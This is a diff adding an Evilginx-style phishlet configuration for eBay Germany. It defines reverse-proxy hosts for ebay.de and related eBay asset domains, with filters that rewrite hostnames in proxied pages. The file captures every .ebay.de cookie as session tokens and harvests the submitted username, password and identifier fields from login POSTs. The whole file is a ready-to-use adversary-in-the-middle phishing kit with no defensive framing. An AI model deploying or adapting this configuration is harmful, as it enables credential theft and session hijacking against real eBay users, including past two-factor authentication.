@@ -1,0 +1,83 @@
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'ebay.de', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'ebay.de', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'signin', orig_sub: 'signin', domain: 'ebay.de', session: true, is_landing: false}
+  - {phish_sub: 'ir', orig_sub: 'ir', domain: 'ebaystatic.com', session: true, is_landing: false}
+  - {phish_sub: 'srv.de', orig_sub: 'srv.de', domain: 'ebayrtm.com', session: true, is_landing: false}
+  - {phish_sub: 'ocsrest', orig_sub: 'ocsrest', domain: 'ebay.de', session: true, is_landing: false}
+  - {phish_sub: 'secureir', orig_sub: 'secureir', domain: 'ebaystatic.com', session: true, is_landing: false}
+  - {phish_sub: 'i', orig_sub: 'i', domain: 'ebayimg.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'pages', orig_sub: 'pages', domain: 'ebay.de', session: true, is_landing: false}
+  - {phish_sub: 'pulsar', orig_sub: 'pulsar', domain: 'ebay.de', session: true, is_landing: false, auto_filter: true}
+#  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com',session: true, is_landing: false}
+#  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false}
+#  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: true, is_landing: false}
+
+# gha.ebay.de
+# reg.ebay.de
+sub_filters:
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'signin', domain: 'ebay.de', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'signin', domain: 'ebay.de', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'signin', domain: 'ebay.de', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'pages', domain: 'ebay.de', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'pages', domain: 'ebay.de', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'pages', domain: 'ebay.de', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'pulsar', domain: 'ebay.de', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'pulsar', domain: 'ebay.de', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'pulsar', domain: 'ebay.de', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+#  - {triggers_on: 'signin.ebay.de', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'signin.ebay.de', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'signin.ebay.de', orig_sub: 'www', domain: 'google.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+#  - {triggers_on: 'signin.ebay.de', orig_sub: 'www', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'signin.ebay.de', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'signin.ebay.de', orig_sub: 'www', domain: 'gstatic.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+#  - {triggers_on: 'signin.ebay.de', orig_sub: 'fonts', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'signin.ebay.de', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'signin.ebay.de', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'ir', domain: 'ebaystatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'ir', domain: 'ebaystatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'ir', domain: 'ebaystatic.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'secureir', domain: 'ebaystatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'secureir', domain: 'ebaystatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'secureir', domain: 'ebaystatic.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'srv.de', domain: 'ebayrtm.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'srv.de', domain: 'ebayrtm.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'srv.de', domain: 'ebayrtm.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'srv.de', domain: 'ebayrtm.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'ocsrest', domain: 'ebay.de', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'ocsrest', domain: 'ebay.de', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.ebay.de', orig_sub: 'ocsrest', domain: 'ebay.de', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.ebay.de'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - '/'
+credentials:
+  username:
+    key: 'userid'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'identifier'
+      search: '(.*)'
+      type: 'post'
+login:
+  domain: 'www.ebay.de'
+  path: '/'
